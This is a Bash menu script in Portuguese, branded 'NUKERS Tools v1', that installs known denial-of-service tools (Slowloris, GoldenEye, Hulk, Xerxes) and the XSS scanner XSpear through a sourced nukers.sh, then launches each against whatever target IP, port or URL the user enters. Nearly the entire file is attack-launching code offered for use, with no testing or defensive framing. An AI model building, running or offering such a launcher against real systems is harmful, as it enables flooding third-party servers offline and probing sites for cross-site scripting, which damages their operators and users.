#!/bin/bash
#author: ᴺᵏ Spider7

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Frase da ᴺᵏㅤㅤㅤ
PHRASE="${PURPLE}A sombra não é inimiga da luz, ela é o lembrete de que até o brilho mais puro carrega um lado oculto${NC}"

# Função para instalar todas as ferramentas chamando nukers.sh
install_tools() {
    if [ ! -f "nukers.sh" ]; then
        echo -e "${RED}Erro: Arquivo nukers.sh não encontrado. Crie-o primeiro.${NC}"
        return 1
    fi
    
    echo -e "${GREEN}Instalando ferramentas...${NC}"
    source ./nukers.sh  # Carrega as funções do nukers.sh
    
    slowloris
    goldeneye
    hulk
    xerxes
    xspear
    
    echo -e "${GREEN}Instalação concluída! Verifique se todas as ferramentas foram clonadas/compiladas corretamente.${NC}"
}

# Função para executar slowloris (prompt para IP e porta)
run_slowloris() {
    if [ ! -d "slowloris" ]; then
        echo -e "${RED}Slowloris não instalado. Instale primeiro.${NC}"
        return 1
    fi
    echo -e "${YELLOW}Digite o IP alvo:${NC}"
    read target_ip
    echo -e "${YELLOW}Digite a porta alvo:${NC}"
    read target_port
    python slowloris/slowloris.py -s $target_ip -p $target_port
}

# Função para executar goldeneye (prompt para IP e porta)
run_goldeneye() {
    if [ ! -d "GoldenEye" ]; then
        echo -e "${RED}GoldenEye não instalado. Instale primeiro.${NC}"
        return 1
    fi
    echo -e "${YELLOW}Digite o IP alvo:${NC}"
    read target_ip
    echo -e "${YELLOW}Digite a porta alvo:${NC}"
    read target_port
    python GoldenEye/goldeneye.py $target_ip -p $target_port
}

# Função para executar hulk (prompt para IP e porta)
run_hulk() {
    if [ ! -d "hulk" ]; then
        echo -e "${RED}Hulk não instalado. Instale primeiro.${NC}"
        return 1
    fi
    echo -e "${YELLOW}Digite o URL alvo (ex: http://example.com):${NC}"
    read target_url
    python hulk/hulk.py $target_url
}

# Função para executar xerxes (prompt para IP e porta)
run_xerxes() {
    if [ ! -f "xerxes" ]; then
        echo -e "${RED}Xerxes não compilado. Instale primeiro.${NC}"
        return 1
    fi
    echo -e "${YELLOW}Digite o IP alvo:${NC}"
    read target_ip
    echo -e "${YELLOW}Digite a porta alvo:${NC}"
    read target_port
    ./xerxes $target_ip $target_port
}

# Função para executar xspear (prompt para URL)
run_xspear() {
    if ! command -v xspear &> /dev/null; then
        echo -e "${RED}Xspear não instalado. Instale primeiro.${NC}"
        return 1
    fi
    echo -e "${YELLOW}Digite a URL alvo:${NC}"
    read target_url
    xspear -u $target_url
}

# Menu central
show_menu() {
    clear
    echo -e "${BLUE}=== NUKERS Tools v1 ===${NC}"
    echo ""
    echo -e "${GREEN}1.${NC} Instalar todas as ferramentas"
    echo -e "${GREEN}2.${NC} Executar Slowloris"
    echo -e "${GREEN}3.${NC} Executar GoldenEye"
    echo -e "${GREEN}4.${NC} Executar Hulk"
    echo -e "${GREEN}5.${NC} Executar Xerxes"
    echo -e "${GREEN}6.${NC} Executar Xspear"
    echo -e "${GREEN}0.${NC} Sair"
    echo ""
    echo -e "${BLUE}======================${NC}"
    echo -e "${YELLOW}Escolha uma opção:${NC}"
    echo ""
    echo -e "${PHRASE}"
    echo ""
}

# Loop do menu
while true; do
    show_menu
    read choice
    case $choice in
        1)
            install_tools
            read -p "$(echo -e ${YELLOW}Pressione Enter para continuar...${NC})"
            ;;
        2)
            run_slowloris
            read -p "$(echo -e ${YELLOW}Pressione Enter para continuar...${NC})"
            ;;
        3)
            run_goldeneye
            read -p "$(echo -e ${YELLOW}Pressione Enter para continuar...${NC})"
            ;;
        4)
            run_hulk
            read -p "$(echo -e ${YELLOW}Pressione Enter para continuar...${NC})"
            ;;
        5)
            run_xerxes
            read -p "$(echo -e ${YELLOW}Pressione Enter para continuar...${NC})"
            ;;
        6)
            run_xspear
            read -p "$(echo -e ${YELLOW}Pressione Enter para continuar...${NC})"
            ;;
        0)
            echo -e "${BLUE}Até logo...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Opção inválida, você leu pelo menos?!${NC}"
            read -p "$(echo -e ${YELLOW}Pressione Enter para continuar...${NC})"
            ;;
    esac
done
